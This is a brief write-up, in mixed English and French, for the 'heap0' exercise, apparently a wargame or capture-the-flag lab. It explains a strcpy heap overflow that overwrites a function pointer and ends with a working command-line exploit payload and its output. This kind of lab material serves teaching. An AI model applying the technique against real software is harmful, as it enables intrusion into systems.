@@ -1,0 +1,13 @@
+this problem is just like stack buffer overflow, except that the overflow happens in heap.
+
+the basic idea is strcpy() does not check write length, thus we can over flow d->name and override fp with function winner()'s address.
+
+donc, nous devons trouver l'adresse de fonction winner() d'abort, juste utilise GDB ou objdump, et l'adresse est 0x804849b.
+
+ensuit, nous trouvons l'adresses ce que d et f montrent, et la distance entre ses deux adresses. juste utilise GDB ou lstrace, la distance est 72.
+
+finalement, nous construisons l'exploition:
+    ./heap0 `python -c "print 'a'*72+'\x9b\x84\x04\x08'"`
+et nous obtenons:
+    data is at 0x804b008, fp is at 0x804b050
+    level passed
